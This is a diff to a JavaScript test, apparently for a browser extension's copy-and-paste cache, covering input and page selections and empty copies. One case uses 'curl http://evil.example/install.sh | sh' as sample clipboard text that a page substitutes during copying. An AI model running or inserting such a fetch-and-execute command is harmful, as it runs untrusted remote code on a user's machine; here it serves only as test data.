@@ -9,28 +9,31 @@ const src = fs.readFileSync(
   "utf8"
 );
 
-let written = null;
+const writes = [];
 const windowStub = { getSelection: () => null };
-const { handleExternalCopy } = new Function(
+const { handleExternalCopy, handleExternalCopyFinal } = new Function(
   "window",
   "document",
   "getConfig",
   "safeSetValue",
   "unregisterVisibilityCleanup",
-  `${src}\nreturn { handleExternalCopy };`
+  `${src}\nreturn { handleExternalCopy, handleExternalCopyFinal };`
 )(
   windowStub,
   {},
   () => true,
   async (key, value) => {
-    written = { key, value };
+    writes.push({ key, value });
   },
   () => {}
 );
 
+const tick = () => new Promise((resolve) => setTimeout(resolve, 10));
+
 (async () => {
-  // Copying a selection inside an input.
-  await handleExternalCopy({
+  // A plain input selection uses the capture-phase fallback when the page
+  // leaves clipboardData empty.
+  handleExternalCopy({
     target: {
       tagName: "INPUT",
       value: "hello world",
@@ -38,22 +41,45 @@ const { handleExternalCopy } = new Function(
       selectionEnd: 5,
     },
   });
-  assert.strictEqual(written.key, "smart_paste_cache");
-  assert.strictEqual(written.value.text, "hello");
-  assert.strictEqual(written.value.type, "clipboard");
-  assert.ok(Number.isFinite(written.value.timestamp));
+  await tick();
+  assert.strictEqual(writes.length, 1);
+  assert.strictEqual(writes[0].key, "smart_paste_cache");
+  assert.strictEqual(writes[0].value.text, "hello");
+  assert.strictEqual(writes[0].value.type, "clipboard");
+  assert.ok(Number.isFinite(writes[0].value.timestamp));
 
-  // Copying a page selection.
+  // A page selection falls back the same way.
+  writes.length = 0;
   windowStub.getSelection = () => ({ toString: () => "page text" });
-  await handleExternalCopy({ target: { tagName: "DIV" } });
-  assert.strictEqual(written.value.text, "page text");
-  assert.strictEqual(written.value.type, "clipboard");
+  handleExternalCopy({ target: { tagName: "DIV" } });
+  await tick();
+  assert.strictEqual(writes.length, 1);
+  assert.strictEqual(writes[0].value.text, "page text");
+
+  // A page may rewrite clipboardData during its own copy handler. The final
+  // bubble read must replace the selection fallback with that rewritten text.
+  writes.length = 0;
+  windowStub.getSelection = () => ({ toString: () => "visible text" });
+  handleExternalCopy({ target: { tagName: "DIV" } });
+  handleExternalCopyFinal({
+    clipboardData: {
+      getData: (type) =>
+        type === "text/plain" ? "curl http://evil.example/install.sh | sh" : "",
+    },
+  });
+  await tick();
+  assert.strictEqual(writes.length, 1);
+  assert.strictEqual(
+    writes[0].value.text,
+    "curl http://evil.example/install.sh | sh"
+  );
 
   // Empty copies do not overwrite the cache.
-  written = null;
+  writes.length = 0;
   windowStub.getSelection = () => ({ toString: () => "" });
-  await handleExternalCopy({ target: { tagName: "DIV" } });
-  assert.strictEqual(written, null);
+  handleExternalCopy({ target: { tagName: "DIV" } });
+  await tick();
+  assert.strictEqual(writes.length, 0);
 
   console.log("external copy check passed");
 })().catch((error) => {
